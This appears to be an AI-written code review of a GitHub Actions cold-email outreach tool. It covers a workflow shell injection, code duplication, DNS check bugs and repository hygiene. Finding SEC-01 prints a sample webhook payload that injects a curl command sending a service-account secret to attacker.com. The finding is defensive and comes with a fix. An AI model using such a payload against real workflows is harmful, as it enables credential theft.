# Comprehensive Code Review & Architecture Audit Report
**Project:** Sheet-bot (Universal Cold Outreach Engine)  
**Version:** 2.2.0  
**Date:** September 4, 2026  
**Auditor:** Senior AI Pair Programmer & System Architect  
**Test Suite Status:** 15 suites, 126 tests passing (100% pass rate)

---

## 1. Executive Summary

`Sheet-bot` is a serverless cold outreach automation engine that leverages Google Sheets as a headless CMS and database, orchestrated through GitHub Actions and `cron-job.org`. It incorporates an array of advanced deliverability and automation features:
- Multi-touch follow-up threads preserving sender and thread identity
- Dynamic spintax and personalization tags
- Active deliverability shields (SPF/DMARC DNS auditing)
- CAN-SPAM compliance with signed HMAC 1-click unsubscribe links and quote-stripped opt-out reply detection
- Adaptive reputation throttling and warmup scheduling
- AI sentiment classification via Groq LLMs (Llama 3.3, Llama 3.1)
- Multi-channel Discord alerts and automatic Google Sheet schema self-repair

### High-Level Verdict
- **Logic & Reliability:** High. Core deliverability safeguards, regex reply cleaning, and schema auto-healing are well thought-out and thoroughly tested.
- **Security Posture:** One **CRITICAL** command injection vulnerability identified in `.github/workflows/outreach.yml`.
- **Maintainability:** Moderate. While modular components in `src/` are well-isolated and immutable, `engine.mjs` is an oversized monolith (1,854 lines) with significant duplication between cold outreach and single-lead flows.
- **Hygiene:** Dead duplicate code (`gcc_tracker.py` in root) and binary artifacts (`gcc_leads.db`) tracked in git.

---

## 2. Severity Scorecard

| ID | Finding | Severity | File / Location | Status |
|:---|:---|:---:|:---|:---:|
| **SEC-01** | GitHub Actions Inline Shell Injection via Unescaped Payload | `CRITICAL` | [outreach.yml:95-102](file:///d:/Codinf%20projets/Sheet-bot/.github/workflows/outreach.yml#L95-L102) | Requires Immediate Fix |
| **ARC-01** | Monolithic Engine with ~300 lines Duplicated Dispatch Logic | `HIGH` | [engine.mjs](file:///d:/Codinf%20projets/Sheet-bot/engine.mjs) | Refactor Recommended |
| **CLN-01** | Stale Duplicate Script with Hardcoded Database Path | `HIGH` | [gcc_tracker.py](file:///d:/Codinf%20projets/Sheet-bot/gcc_tracker.py) | Safe to Remove |
| **BUG-02** | Case-Sensitive DMARC Check & Flattened TXT Record Splitting | `MEDIUM` | [src/dns-check.mjs:21-37](file:///d:/Codinf%20projets/Sheet-bot/src/dns-check.mjs#L21-L37) | Fix Recommended |
| **PERF-01** | Persistent Global Regex with `test()` in While Loop | `MEDIUM` | [src/spintax.mjs:12-20](file:///d:/Codinf%20projets/Sheet-bot/src/spintax.mjs#L12-L20) | Fix Recommended |
| **GIT-01** | Binary SQLite Database Tracked in Git Repository | `MEDIUM` | [scripts/gcc_leads.db](file:///d:/Codinf%20projets/Sheet-bot/scripts/gcc_leads.db) | Fix Recommended |
| **RES-01** | Blind Exponential Backoff on Permanent 535 / EAUTH Auth Errors | `LOW` | [src/retry.mjs:6-22](file:///d:/Codinf%20projets/Sheet-bot/src/retry.mjs#L6-L22) | Optimization |

---

## 3. Deep-Dive Findings & Concrete Remediations

### 🚨 SEC-01 [CRITICAL]: GitHub Actions Shell Injection

#### Vulnerability Details
In `.github/workflows/outreach.yml`, lines 95–101 and 108–111 directly expand expressions like `${{ github.event.client_payload.email }}` and `${{ toJson(github.event.client_payload.leads) }}` inside an inline `run: |` bash script:

```bash
# VULNERABLE PATTERN
export SINGLE_EMAIL="${{ github.event.client_payload.email }}"
export SINGLE_NAME="${{ github.event.client_payload.full_name || github.event.client_payload.personName }}"
export SINGLE_LEADS_JSON='${{ toJson(github.event.client_payload.leads) }}'
```

#### Exploit Mechanism
GitHub Actions renders `${{ ... }}` templates *before* invoking the shell. If a webhook payload contains quotes or shell metacharacters:
```json
{
  "client_payload": {
    "email": "test@test.com\"; curl https://attacker.com/leak?token=$GOOGLE_SERVICE_ACCOUNT_JSON; echo \""
  }
}
```
The shell parses the semicolon and executes the injected bash command with runner permissions, potentially exfiltrating `GOOGLE_SERVICE_ACCOUNT_JSON` or `SPREADSHEET_ID`.

#### Remediation Diff
Assign payload variables inside the step's `env:` block. When placed in `env:`, GitHub Actions injects them directly into the process environment table without shell evaluation.

```diff
       - name: Run Engine Task
+        env:
+          GOOGLE_APPLICATION_CREDENTIALS: /tmp/gsa.json
+          SPREADSHEET_ID: ${{ secrets.SPREADSHEET_ID }}
+          PAYLOAD_EMAIL: ${{ github.event.client_payload.email || github.event.inputs.email }}
+          PAYLOAD_NAME: ${{ github.event.client_payload.full_name || github.event.client_payload.personName || github.event.inputs.full_name }}
+          PAYLOAD_COMPANY: ${{ github.event.client_payload.company_name || github.event.client_payload.companyName || github.event.inputs.company_name }}
+          PAYLOAD_LOCATION: ${{ github.event.client_payload.location || github.event.inputs.location }}
+          PAYLOAD_SHEET_ID: ${{ github.event.client_payload.spreadsheet_id || github.event.client_payload.sheet_id }}
+          PAYLOAD_WEBHOOK_URL: ${{ github.event.client_payload.webhook_url || github.event.client_payload.discord_webhook }}
+          PAYLOAD_LEADS_JSON: ${{ toJson(github.event.client_payload.leads) }}
         run: |
           set -euo pipefail
 
           echo "Trigger: ${{ github.event_name }} | Cron: $SCHEDULED_CRON | Action: $SELECTED_ACTION"
 
           # 1. Webhook Repository Dispatch (Single / Bulk Remote Trigger)
           if [ "${{ github.event_name }}" = "repository_dispatch" ]; then
             echo "Running Remote Dispatch from Repository Webhook..."
-            export SINGLE_EMAIL="${{ github.event.client_payload.email }}"
-            export SINGLE_NAME="${{ github.event.client_payload.full_name || github.event.client_payload.personName }}"
-            export SINGLE_COMPANY="${{ github.event.client_payload.company_name || github.event.client_payload.companyName }}"
-            export SINGLE_LOCATION="${{ github.event.client_payload.location }}"
-            export SINGLE_SHEET_ID="${{ github.event.client_payload.spreadsheet_id || github.event.client_payload.sheet_id }}"
-            export SINGLE_WEBHOOK_URL="${{ github.event.client_payload.webhook_url || github.event.client_payload.discord_webhook }}"
-            export SINGLE_LEADS_JSON='${{ toJson(github.event.client_payload.leads) }}'
+            export SINGLE_EMAIL="$PAYLOAD_EMAIL"
+            export SINGLE_NAME="$PAYLOAD_NAME"
+            export SINGLE_COMPANY="$PAYLOAD_COMPANY"
+            export SINGLE_LOCATION="$PAYLOAD_LOCATION"
+            export SINGLE_SHEET_ID="$PAYLOAD_SHEET_ID"
+            export SINGLE_WEBHOOK_URL="$PAYLOAD_WEBHOOK_URL"
+            export SINGLE_LEADS_JSON="$PAYLOAD_LEADS_JSON"
             node engine.mjs single_lead
```

---

### ⚠️ ARC-01 [HIGH]: `engine.mjs` Monolith & Logic Duplication

#### Analysis
At 1,854 lines, `engine.mjs` bundles:
1. Google Sheets I/O & Tab creation
2. IMAP Draft creation
3. Workflow timeout checks & restart chaining
4. `runColdOutreach()` (345 lines)
5. `runSingleLeadOutreach()` (312 lines)
6. `runFollowups()` (285 lines)
7. `classifyEmailWithAi()` & `runInboxChecker()` (290 lines)
8. `generateDailyDigest()` (79 lines)

Between `runColdOutreach` and `runSingleLeadOutreach`, nearly 300 lines of identical logic are repeated:
- Initializing Nodemailer SMTP transport
- Checking and updating daily quota per inbox
- Verifying suppression list and domain MX records
- Applying Spintax, variable replacements, and generating the CAN-SPAM footer
- Updating Google Sheets row status with timestamp and alias tracking
- Discord error and success notifications

#### Remediation Plan
Extract a unified dispatcher:
```javascript
// src/dispatcher.mjs
export async function dispatchEmailToLead({
  lead,
  template,
  inboxes,
  aliases,
  settings,
  sheetsObj,
  context = 'cold_outreach'
}) {
  // Single reusable pipeline for MX check, spintax, throttle, send, and status logging
}
```
This reduces `engine.mjs` by ~500 lines and ensures fixes applied to cold outreach automatically protect single-lead dispatch.

---

### ⚠️ CLN-01 [HIGH]: Stale Duplicate `gcc_tracker.py`

#### Analysis
There are two copies of `gcc_tracker.py` in the repository:
1. `gcc_tracker.py` (root directory, 19,051 bytes)
2. `scripts/gcc_tracker.py` (scripts directory, 19,104 bytes)

`scripts/run-gcc-radar.mjs:88` explicitly invokes:
```javascript
const trackerScriptPath = path.join(scriptDir, 'gcc_tracker.py');
```
The version in `scripts/` correctly computes `db_path = os.path.join(db_dir, "gcc_leads.db")`, whereas the root version uses relative `sqlite3.connect("gcc_leads.db")`. The root copy is stale dead code.

#### Remediation
Delete `gcc_tracker.py` from the root directory.

---

### 🔍 BUG-02 [MEDIUM]: DMARC Case Sensitivity & DNS TXT Record Splitting

#### Analysis
In `src/dns-check.mjs`:
1. **Case Sensitivity:**
   ```javascript
   const foundDmarc = dmarcRecords.find((r) => typeof r === 'string' && r.startsWith('v=DMARC1'));
   ```
   RFC 7489 Section 6.3 states tag names and values are case-insensitive. If a domain sets `v=dmarc1`, `checkDomainAuth()` incorrectly reports DMARC missing.
2. **Chunk Splitting:**
   `resolveTxt()` returns `string[][]`. Flattening via `.flat()` splits long TXT records (>255 characters per RFC 1035 chunk) into multiple fragmented strings rather than concatenating chunks of the same record.

#### Remediation Diff
```diff
   try {
-    const txtRecords = (await resolveTxt(cleanDomain)).flat();
-    const foundSpf = txtRecords.find((r) => typeof r === 'string' && r.startsWith('v=spf1'));
+    const rawRecords = await resolveTxt(cleanDomain);
+    const txtRecords = rawRecords.map((chunks) => (Array.isArray(chunks) ? chunks.join('') : String(chunks)));
+    const foundSpf = txtRecords.find((r) => typeof r === 'string' && /^v\s*=\s*spf1/i.test(r.trim()));
     if (foundSpf) {
       result.spf = true;
       result.spfRecord = foundSpf;
     }
   } catch {
     // No SPF record or lookup error
   }
 
   try {
-    const dmarcRecords = (await resolveTxt(`_dmarc.${cleanDomain}`)).flat();
-    const foundDmarc = dmarcRecords.find((r) => typeof r === 'string' && r.startsWith('v=DMARC1'));
+    const rawDmarc = await resolveTxt(`_dmarc.${cleanDomain}`);
+    const dmarcRecords = rawDmarc.map((chunks) => (Array.isArray(chunks) ? chunks.join('') : String(chunks)));
+    const foundDmarc = dmarcRecords.find((r) => typeof r === 'string' && /^v\s*=\s*dmarc1/i.test(r.trim()));
     if (foundDmarc) {
       result.dmarc = true;
       result.dmarcRecord = foundDmarc;
     }
```

---

### 🔍 PERF-01 [MEDIUM]: Stateful Global Regex with `test()` in While Loop

#### Analysis
In `src/spintax.mjs:12-21`:
```javascript
const spintaxRegex = /\{{1,3}([^{}]+?\|[^{}]+?)\}{1,3}/g;

let iterations = 0;
while (spintaxRegex.test(current) && iterations < 10) {
  current = current.replace(spintaxRegex, (_, choices) => { ... });
  iterations++;
}
```
In JavaScript, calling `.test()` on a RegExp instance with the `/g` flag modifies its `lastIndex` property. While `.replace()` resets `lastIndex` upon full replacement, combining `.test()` and `.replace()` on a mutated string inside a loop is fragile and can skip matches if pattern positions shift.

#### Remediation Diff
```diff
-  const spintaxRegex = /\{{1,3}([^{}]+?\|[^{}]+?)\}{1,3}/g;
+  const hasSpintax = /\{{1,3}[^{}]+?\|[^{}]+?\}{1,3}/;
+  const spintaxRegex = /\{{1,3}([^{}]+?\|[^{}]+?)\}{1,3}/g;
 
   let iterations = 0;
-  while (spintaxRegex.test(current) && iterations < 10) {
+  while (hasSpintax.test(current) && iterations < 10) {
     current = current.replace(spintaxRegex, (_, choices) => {
```

---

### 🔍 GIT-01 [MEDIUM]: Binary SQLite Database Tracked in Git

#### Analysis
- `scripts/gcc_leads.db` (20 KB) is committed to git.
- In `.gitignore`, line 29 contains: `!**/gcc_leads.db`.
- Committing SQLite binaries causes perpetual git repository bloat, dirty merge conflicts on concurrent runners, and risks leaking local execution state.

#### Remediation
1. Remove `!**/gcc_leads.db` from `.gitignore`.
2. Untrack the database: `git rm --cached scripts/gcc_leads.db`.
3. In `scripts/gcc_tracker.py`, ensure the SQLite table schema is automatically created if the database does not exist: `cursor.execute("CREATE TABLE IF NOT EXISTS seen_gccs (...)")`.

---

## 4. Strengths & Architectural Highlights

1. **CAN-SPAM Reply Detection (`src/suppression.mjs`):**
   `stripQuotedReply()` cleans `On ... wrote:`, `From:`, and `> ` quote lines before checking opt-out phrases. This elegantly solves the industry-wide bug where a bot's own unsubscribe footer causes incoming positive responses to be falsely flagged as opt-outs.
2. **Dynamic Cron Synchronization (`scripts/setup-cron.mjs`):**
   Non-destructive diffing against `cron-job.org` API with progressive 429 rate-limit backoff (1s -> 2s -> 5s -> 10s) ensures no duplicate timers are created when sheet schedules change.
3. **Automated Schema Audit & Self-Healing (`scripts/run-campaign-diagnostics.mjs`):**
   The diagnostic suite detects missing tabs, missing columns, and missing configuration keys, automatically appending missing headers and formulas without disturbing existing data.
4. **Comprehensive Test Suite:**
   126 native tests covering unit scenarios, rate-limit backoffs, edge cases, and simulation loops without requiring external testing framework overhead.

---

## 5. Prioritized Action Plan

| Phase | Action | Priority | Est. Time |
|---|---|:---:|:---:|
| **Phase 1** | Patch shell injection in `.github/workflows/outreach.yml` | `Immediate` | 10 mins |
| **Phase 2** | Remove root `gcc_tracker.py` and untrack `scripts/gcc_leads.db` | `Immediate` | 5 mins |
| **Phase 3** | Fix DMARC case-sensitivity and DNS chunk joining | `High` | 15 mins |
| **Phase 4** | Extract shared lead dispatch helper from `engine.mjs` | `Medium` | 1-2 hours |
